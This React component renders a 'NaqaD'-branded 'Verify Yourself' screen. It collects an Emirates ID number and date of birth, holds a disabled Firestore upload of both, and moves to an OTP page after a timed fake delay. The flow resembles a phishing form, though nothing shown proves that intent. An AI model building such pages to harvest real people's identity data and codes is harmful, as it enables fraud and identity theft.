import React, { useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { useNavigate } from "react-router-dom";
import Logo from "@/assets/logo.png";
import Whatsapp from "@/assets/whatsapp.png";
// import { uploadData } from "@/firebase/FirebaseUtils"; // 🔥 keep for later

const DOB = () => {
  const [emiratesId, setEmiratesId] = useState("");
  const [dob, setDob] = useState("");
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const handleNext = async () => {
    setLoading(true);

    // 🔥 Firestore upload (disabled for now)
    /*
    try {
      await uploadData({ emiratesId, dob });
    } catch (error) {
      console.error("Error saving data:", error);
    }
    */

    setTimeout(() => {
      setLoading(false);
      navigate("/otp");
    }, 2000);
  };

  return (
    <div className="min-h-[90vh] bg-white flex flex-col justify-between px-6 pt-10 pb-6 relative">
      {/* Header */}
      <div className="w-full flex items-center justify-center relative">
        <div className="flex items-center gap-2">
          <img src={Logo} alt="Logo" className="w-10 h-10" />
          <span className="text-2xl font-bold">NaqaD</span>
        </div>
        <img
          src={Whatsapp}
          alt="Whatsapp"
          className="w-8 h-8 rounded-full absolute right-0"
        />
      </div>

      {/* Main content */}
      <div className="w-full flex flex-col mt-10 flex-1">
        <h1 className="text-xl font-semibold">Verify Yourself</h1>
        <p className="text-sm text-gray-500">Enter Emirates ID and Date of Birth</p>

        {/* Emirates ID Input */}
        <div className="w-full mt-6">
          <label className="block text-sm text-gray-700 mb-2">Emirates ID</label>
          <div className="flex items-center border rounded-lg px-3 py-2">
            <Input
              value={emiratesId}
              onChange={(e) => setEmiratesId(e.target.value)}
              placeholder="Enter Emirates ID"
              className="border-0 focus:ring-0 flex-1 p-0 shadow-none"
            />
          </div>
        </div>

        {/* Date of Birth Input */}
        <div className="w-full mt-4">
          <label className="block text-sm text-gray-700 mb-2">Date of Birth</label>
          <div className="flex items-center border rounded-lg px-3 py-2">
            <Input
              type="date"
              value={dob}
              onChange={(e) => setDob(e.target.value)}
              className="border-0 focus:ring-0 flex-1 p-0 shadow-none"
            />
          </div>
        </div>
      </div>

      {/* Bottom section */}
      <div className="w-full mt-6">
        <Button
          onClick={handleNext}
          disabled={loading}
          className="w-full bg-blue-900 hover:bg-blue-800 py-4 rounded-lg"
        >
          {loading ? "Loading..." : "Next"}
        </Button>
      </div>
    </div>
  );
};

export default DOB;
